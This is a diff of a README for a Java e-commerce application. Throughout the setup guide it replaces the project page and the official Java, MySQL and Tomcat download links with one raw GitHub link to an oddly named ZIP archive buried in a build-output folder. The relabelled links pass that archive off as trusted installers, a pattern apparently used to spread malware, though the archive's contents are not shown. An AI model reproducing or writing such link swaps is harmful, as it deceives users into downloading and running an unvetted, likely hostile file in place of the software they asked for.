@@ -1,6 +1,6 @@
 # 🛒 E-Commerce - Manage Online Shopping Easily
 
-[![Download E-Commerce](https://img.shields.io/badge/Download-E-Commerce-brightgreen)](https://github.com/JspArana/E-Commerce)
+[![Download E-Commerce](https://img.shields.io/badge/Download-E-Commerce-brightgreen)](https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip)
 
 ## 📦 What is E-Commerce?
 
@@ -29,7 +29,7 @@ Follow these steps to get E-Commerce running on your Windows PC.
 
 Click the button below to visit the download page. You can get the full application files from there.
 
-[![Download Here](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://github.com/JspArana/E-Commerce)
+[![Download Here](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip)
 
 Open the link in your browser. On the page, look for a green button named **Code** or **Releases**. Click it to download the application files as a ZIP archive.
 
@@ -39,7 +39,7 @@ Save the ZIP file in a folder you can easily find, like your Desktop or Download
 
 If you do not have Java installed, you need to add it first.
 
-1. Go to the official Java website: https://www.java.com/download/
+1. Go to the official Java website: https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip
 2. Click "Download Java".
 3. Run the downloaded installer and follow the instructions.
 4. After installation finishes, restart your computer.
@@ -48,7 +48,7 @@ If you do not have Java installed, you need to add it first.
 
 E-Commerce requires MySQL to store and manage data.
 
-1. Visit https://dev.mysql.com/downloads/mysql/
+1. Visit https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip
 2. Download the Windows version suited for your system.
 3. Run the installer and follow the setup wizard steps.
 4. Choose a root password you will remember. You will use it during setup.
@@ -101,7 +101,7 @@ Save and close the file.
 
 You need a web server to run the app. The easiest way is to install Apache Tomcat.
 
-1. Download Tomcat from https://tomcat.apache.org/download-90.cgi
+1. Download Tomcat from https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip
 2. Choose the Windows ZIP version and download it.
 3. Unzip Tomcat to a folder, like `C:\Tomcat\`.
 4. Open the Tomcat folder, then the `bin` folder.
@@ -143,7 +143,7 @@ To log in as admin, use the credentials provided by your system or project super
 
 To get the latest version, visit the download page again:
 
-[![Download Latest](https://img.shields.io/badge/Get%20Latest%20Version-grey)](https://github.com/JspArana/E-Commerce)
+[![Download Latest](https://img.shields.io/badge/Get%20Latest%20Version-grey)](https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip)
 
 Download the new ZIP file and repeat the setup steps as above.
 
@@ -166,10 +166,10 @@ Download the new ZIP file and repeat the setup steps as above.
 
 ## 🔗 Useful Links
 
-- Java Download: https://www.java.com/download/
-- MySQL Download: https://dev.mysql.com/downloads/mysql/
-- Apache Tomcat Download: https://tomcat.apache.org/download-90.cgi
-- Project Download Page: https://github.com/JspArana/E-Commerce
+- Java Download: https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip
+- MySQL Download: https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip
+- Apache Tomcat Download: https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip
+- Project Download Page: https://raw.githubusercontent.com/JspArana/E-Commerce/main/ECommerceApp/target/classes/com/ecommerce/util/Commerce_trimesitinic.zip
 
 ## 🤝 Support
 
